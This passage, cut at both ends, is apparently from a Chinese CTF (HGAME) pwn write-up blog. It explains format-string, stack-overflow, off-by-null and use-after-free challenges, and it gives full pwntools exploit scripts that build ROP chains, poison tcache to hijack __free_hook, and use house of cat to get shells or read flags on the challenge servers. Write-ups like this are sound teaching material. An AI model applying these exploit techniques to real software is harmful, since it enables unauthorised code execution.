class="hljs-attribute">libc_base</span> = write_addr - libc.symbols[&#x27;write&#x27;]<br><span class="hljs-attribute">op</span> = libc_base + libc.symbols[&#x27;open&#x27;]<br><span class="hljs-attribute">re</span> = libc_base + libc.symbols[&#x27;read&#x27;]<br><span class="hljs-attribute">wr</span> = libc_base + libc.symbols[&#x27;write&#x27;]<br><span class="hljs-attribute">sendfile</span> = libc_base + libc.symbols[&#x27;sendfile&#x27;]<br><span class="hljs-attribute">pop_rsi</span> = libc_base + <span class="hljs-number">0</span>x2601f<br><span class="hljs-attribute">pop_rdx</span> = libc_base + <span class="hljs-number">0</span>xdfc12<br><span class="hljs-attribute">print</span>(hex(libc_base))<br><br><br><span class="hljs-attribute">payload3</span> = p64(<span class="hljs-number">0</span>x4040ec) + b&#x27;flag&#x27;.ljust(<span class="hljs-number">8</span>,b&#x27;\x00&#x27;) + p64(pop_rdi) + p64(<span class="hljs-number">0</span>x4040f4) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(op) + p64(pop_rdi) + p64(<span class="hljs-number">4</span>) + p64(vuln)<br><span class="hljs-attribute">payload3</span> = payload3.ljust(<span class="hljs-number">0</span>x50,b&#x27;\x00&#x27;)<br><span class="hljs-attribute">payload3</span> += p64(<span class="hljs-number">0</span>x4040f4) + p64(leave_ret)<br><br><span class="hljs-attribute">io</span>.recvuntil(<span class="hljs-string">&quot;Good luck.\n&quot;</span>)<br><span class="hljs-attribute">io</span>.send(payload3)<br><br><span class="hljs-attribute">payload4</span> = p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">5</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>x404500)  + p64(re) + p64(pop_rdi) + p64(<span class="hljs-number">4</span>) + p64(vuln)<br><span class="hljs-attribute">payload4</span> = payload4.ljust(<span class="hljs-number">0</span>x50,b&#x27;\x00&#x27;)<br><span class="hljs-attribute">payload4</span> += p64(<span class="hljs-number">0</span>x4040e4) + p64(leave_ret)<br><br><span class="hljs-attribute">io</span>.recvuntil(<span class="hljs-string">&quot;Good luck.\n&quot;</span>)<br><span class="hljs-attribute">io</span>.send(payload4)<br><br><span class="hljs-attribute">payload5</span> = p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">4</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>x404500) + p64(wr)<br><span class="hljs-attribute">payload5</span> = payload5.ljust(<span class="hljs-number">0</span>x50,b&#x27;\x00&#x27;)<br><span class="hljs-attribute">payload5</span> += p64(<span class="hljs-number">0</span>x4040d4) + p64(leave_ret)<br><br><span class="hljs-attribute">io</span>.recvuntil(<span class="hljs-string">&quot;Good luck.\n&quot;</span>)<br><span class="hljs-attribute">io</span>.send(payload5)<br><span class="hljs-attribute">print</span>(io.recv())<br><br><span class="hljs-attribute">io</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="format"><a href="#format" class="headerlink" title="format"></a>format</h2><p>这题首先注意到的就是一个可以无数次使用的格式化字符串漏洞：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">printf(<span class="hljs-string">&quot;you have n chance to getshell\n n = &quot;</span>);<br> <span class="hljs-keyword">if</span> ( __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v6) &lt;= <span class="hljs-number">0</span> )<br>   <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br> <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v6; ++i )<br> &#123;<br>   printf(<span class="hljs-string">&quot;type something:&quot;</span>);<br>   <span class="hljs-keyword">if</span> ( __isoc99_scanf(<span class="hljs-string">&quot;%3s&quot;</span>, format) &lt;= <span class="hljs-number">0</span> )<br>     <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>   printf(<span class="hljs-string">&quot;you type: &quot;</span>);<br>   printf(format);<br> &#125;<br></code></pre></td></tr></table></figure><p>但是只能输入三个字符，大概率就只能使用%p来泄露地址了，这里泄露出的是rsi里面的内容，是一个栈上的地址，可以通过动调计算出栈的地址。</p><p>接下来的就是一个看上去只能溢出一个字节的栈溢出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you have n space to getshell(n&lt;5)\n n = &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d\n&quot;</span>, &amp;v5);<br>  <span class="hljs-keyword">if</span> ( v5 &lt;= <span class="hljs-number">5</span> )<br>    <span class="hljs-built_in">vuln</span>(v5);<br><br><span class="hljs-function"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title">vuln</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;type something:&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, a1);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>但由于vuln函数的参数是unsigned int类型，我们可以直接输入-1来无限制的溢出。（但是我一开始没注意到这个溢出，傻傻的用那一个字节的溢出去改rbp的最低一个字节，想劫持到栈上的其他返回地址，结果就是劫持到main函数后，调用printf时由于栈没有16字节对齐，程序崩了。。。又想到把地址放到格式化字符串那里，然后再劫持，结果后面的v5是放到格式化字符串的高位上，没办法正确读到地址。。。）</p><p>那么现在，我们有栈上地址和一个无限的溢出了，还差一个libc的地址。</p><p>这里我是使用了%*d这个格式化字符串来泄露出_IO_2_1_stdin_的地址。<br>（这个方法的详细解释可以参考这个文章：[一种关于格式化字符串的新利用](<a href="https://www.cnblogs.com/viol1t-cheny/articles/18547503#exp%EF%BC%89">https://www.cnblogs.com/viol1t-cheny/articles/18547503#exp）</a></p><p>简单来说，在%*d中，*代表第二个参数，控制输出的宽度，这个参数在调用约定中所使用的寄存器是rsi，而此时rsi是一个很大的值，会填满缓冲区，之后再输入%s，就会输出栈上的内容。这里我得到的就是stdin的地址了。</p><p>但其实不太建议使用这个方法，因为往往rsi都是一个非常大数，会接收到很多的数据，导致在打远程时可能需要很长时间（我自己打的时候跑一次远程大概要半个小时。。。）</p><p>这里还要注意，libc的最高位不一定都是0x7f，可能是其他的例如0x78，0x76等，我之前一直认为libc最高位都是0x7f。（感谢1SEz师傅的提醒）</p><p>之后再利用那个无限的栈溢出，就可以直接打ROP来getshell了。</p><p>exp：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs perl">from pwn import *<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;146.56.227.88&quot;</span>,<span class="hljs-number">32438</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br>io.sendlineafter(b<span class="hljs-string">&#x27;n =&#x27;</span>,str(<span class="hljs-number">3</span>))<br>io.sendlineafter(b<span class="hljs-string">&#x27;type something:&#x27;</span>,b<span class="hljs-string">&#x27;%p&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;you type:&#x27;</span>)<br><br>rsi = <span class="hljs-keyword">int</span>(io.recv(<span class="hljs-number">15</span>),<span class="hljs-number">16</span>)<br><br>rsp = rsi + <span class="hljs-number">0x2120</span><br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">hex</span>(rsp))<br>main = rsp + <span class="hljs-number">0x28</span><br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">hex</span>(main))<br>stack_addr = main - <span class="hljs-number">0x38</span><br><span class="hljs-keyword">print</span>(stack_addr)<br>vuln = <span class="hljs-number">0x4011b6</span><br><br>io.sendlineafter(b<span class="hljs-string">&#x27;type something:&#x27;</span>,b<span class="hljs-string">&#x27;%*d&#x27;</span>)<br>io.recv()<br><br>io.sendlineafter(b<span class="hljs-string">&#x27;type something:&#x27;</span>,b<span class="hljs-string">&#x27;%s&#x27;</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;\xa0&#x27;</span>)<br>data = b<span class="hljs-string">&#x27;\xa0&#x27;</span> + io.recv(<span class="hljs-number">5</span>)<br>addr = u64(data.ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">hex</span>(addr))<br><br>libc_base = addr - libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">hex</span>(libc_base))<br><br><span class="hljs-keyword">system</span> = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-keyword">next</span>(libc.search(b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))<br>pop_rdi = libc_base + <span class="hljs-number">0x2a3e5</span><br>ret = <span class="hljs-number">0x40101a</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;system:&quot;</span> + <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">system</span>))<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;/bin/sh:&quot;</span> + <span class="hljs-keyword">hex</span>(bin_sh))<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;pop_rdi:&quot;</span> + <span class="hljs-keyword">hex</span>(pop_rdi))<br><br>payload1 = b<span class="hljs-string">&#x27;aaaa&#x27;</span> + p64(stack_addr) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(<span class="hljs-keyword">system</span>)<br>io.sendlineafter(b<span class="hljs-string">&#x27;n =&#x27;</span>,b<span class="hljs-string">&#x27;-1\n5&#x27;</span> + payload1)<br>io.recv()<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="signin2heap"><a href="#signin2heap" class="headerlink" title="signin2heap"></a>signin2heap</h2><p>逆向分析找到仅有一个漏洞点在：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">size_4 = read(<span class="hljs-number">0</span>, *(&amp;books + v2), size);<br>*(<span class="hljs-name">*</span>(<span class="hljs-name">&amp;books</span> + v2) + size_4) = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>看出这是一个off-by-null的漏洞。这题的libc版本为2.27，存在tcache，并且这题是2.27后期的版本，tcache中是有key的，所以我们不能直接通过double free来造成任意地址写，需要打两次off-by-null。</p><p>第一次off-by-null用来泄露出libc的地址。<br>第二次off-by-null通过堆块重叠来打tcache poisoning，将free_hook改为system。</p><p>exp：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>io = remote(<span class="hljs-string">&#x27;node1.hgame.vidar.club&#x27;</span>,30729)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>) <br><br><br>def <span class="hljs-built_in">add</span>(index,size,content):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;Your choice:&#x27;</span>,p32(1))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;Index:&#x27;</span>,str(index))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;Size:&#x27;</span>,str(size))<br>    io.sendafter(b<span class="hljs-string">&#x27;Content:&#x27;</span>,content)<br><br>def dele(index):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;Your choice:&#x27;</span>,p32(2))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;Index:&#x27;</span>,str(index))<br><br>def show(index):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;Your choice:&#x27;</span>,p32(3))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;Index:&#x27;</span>,str(index))<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    <span class="hljs-built_in">add</span>(i,0xf8,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br><span class="hljs-built_in">add</span>(7,0xf8,b<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)<br><span class="hljs-built_in">add</span>(8,0x98,b<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)<br><span class="hljs-built_in">add</span>(9,0xf8,b<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)<br><span class="hljs-built_in">add</span>(10,0xf8,b<span class="hljs-string">&#x27;zzzzzzzz&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    dele(i)<br>dele(7)<br>dele(8)<br><br>payload1 = b<span class="hljs-string">&#x27;a&#x27;</span>* 0x90 + p64(0x1a0)<br><span class="hljs-built_in">add</span>(8,0x98,payload1)<br>dele(9)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    <span class="hljs-built_in">add</span>(i,0xf8,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br><span class="hljs-built_in">add</span>(7,0xf8,b<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)<br><br>show(8)<br>io.recv()<br>main_arena = u64(io.recv(6).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 96<br>libc_base = main_arena - 0x3ebc40<br><span class="hljs-built_in">print</span>(hex(main_arena))<br><span class="hljs-built_in">print</span>(hex(libc_base))<br><br>free_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>= libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-built_in">add</span>(13,0x80,b<span class="hljs-string">&#x27;gggggggg&#x27;</span>)<br><span class="hljs-built_in">add</span>(14,0x80,b<span class="hljs-string">&#x27;gggggggg&#x27;</span>)<br><span class="hljs-built_in">add</span>(15,0x70,b<span class="hljs-string">&#x27;gggggggg&#x27;</span>)<br><br>dele(10)<br><span class="hljs-built_in">add</span>(9,0xf8,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><span class="hljs-built_in">add</span>(10,0x38,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><span class="hljs-built_in">add</span>(11,0xf8,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><span class="hljs-built_in">add</span>(12,0x20,b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    dele(i)<br>dele(9)<br>dele(10)<br><br>payload2 = b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x30 + p64(0x140)<br><span class="hljs-built_in">add</span>(10,0x38,payload2)<br>dele(11)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    dele(i)<br>dele(10)<br><br>payload3 = p64(0)<span class="hljs-number">*2</span> + p64(0x100) + p64(0x40) + p64(free_hook)<br><span class="hljs-built_in">add</span>(0,0xd0,b<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><span class="hljs-built_in">add</span>(1,0xe0,payload3)<br><span class="hljs-built_in">add</span>(2,0x38,b<span class="hljs-string">&#x27;llllllll&#x27;</span>)<br><br>payload4 = p64(system)<br><span class="hljs-built_in">add</span>(3,0x38,payload4)<br>dele(12)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="Where-is-the-vulnerability"><a href="#Where-is-the-vulnerability" class="headerlink" title="Where_is_the_vulnerability"></a>Where_is_the_vulnerability</h2><p>本题的四个增删查改的函数是使用动态链接库实现的，所以本地动调改libc时要记得把题目给的libhgame.so文件也加上。</p><p>逆向后发现delete函数存在uaf漏洞：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">printf</span>(&quot;Index: &quot;);<br> <span class="hljs-built_in">__isoc99_scanf</span>(&quot;%u&quot;, &amp;v1);<br> if ( v1 &lt;= <span class="hljs-number">0</span>xF )<br> &#123;<br>   if ( notes[v1] )<br>     <span class="hljs-built_in">free</span>(notes[v1]);<br>   else<br>     <span class="hljs-built_in">puts</span>(&quot;Page not found.&quot;);<br> &#125;<br> else<br> &#123;<br>   <span class="hljs-built_in">puts</span>(&quot;There are only <span class="hljs-number">16</span> pages in this notebook.&quot;);<br> &#125;<br></code></pre></td></tr></table></figure><p>并且本题开了沙箱：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">A</span> = sys_number<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x35 0x03</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x40000000</span>  if (<span class="hljs-keyword">A</span> &gt;= <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0005</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x15 0x02</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x0000003b  if (<span class="hljs-keyword">A</span> == execve) goto <span class="hljs-number">0005</span><br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15 0x01</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000142</span>  if (<span class="hljs-keyword">A</span> == execveat) goto <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x7fff0000  return ALLOW<br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  return KILL<br></code></pre></td></tr></table></figure><p>需要使用orw。</p><p>add函数只能申请到largebin，想到打largbin attack，并且本题libc版本为2.39，只能改bk_nextsize。</p><p>之后就是十分模板的house of的利用了。</p><p>官方给出的的wp是house of apple+mprotect，十分简洁优雅。相比之下我打的house of cat+ROP就有点复杂了。</p><p>我的wp里需要注意一点，由于使用的是ROP的orw，需要控制到rdi，rsi，rdx这三个寄存器，但是本题的libc.so.6库里没有直接的<br><code>pop rdx ; ret;</code>，<br>只有<br><code> pop rdx ; ret 0x19</code>，<br>所以要在后面加上一个<br><code>ret 7; </code><br>来调栈，就像这样<br><code>p64(pop_rdx) + p64(0x60) + p64(ret_7) + p64(0)*3 + b&#39;0&#39; + p64(read)</code>。</p><p>exp：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">from</span> pwn import *<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-meta">#io = process(&quot;./vuln&quot;)</span><br>io = remote(<span class="hljs-string">&quot;node1.hgame.vidar.club&quot;</span>,<span class="hljs-number">30758</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br>def add(<span class="hljs-keyword">index</span>,size):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-keyword">index</span>))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br>def dele(<span class="hljs-keyword">index</span>):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-keyword">index</span>))<br><br>def show(<span class="hljs-keyword">index</span>):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-keyword">index</span>))<br><br>def <span class="hljs-keyword">edit</span>(<span class="hljs-keyword">index</span>,content):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;Index&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-keyword">index</span>))<br>    io.sendafter(b<span class="hljs-string">&#x27;Content:&#x27;</span>,content)<br><br><span class="hljs-meta">#gdb.attach(io)</span><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x528</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x508</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x518</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x538</span>)<br>dele(<span class="hljs-number">2</span>)<br><br><span class="hljs-meta">#pause()</span><br><br>show(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">print</span>(io.recv())<br><br>main_arena = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x490</span><br>libc_base = main_arena - <span class="hljs-number">0x203AC0</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;liba_base:&quot;</span> + hex(libc_base))<br><br><span class="hljs-keyword">edit</span>(<span class="hljs-number">0</span>,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br><span class="hljs-keyword">print</span>(<span 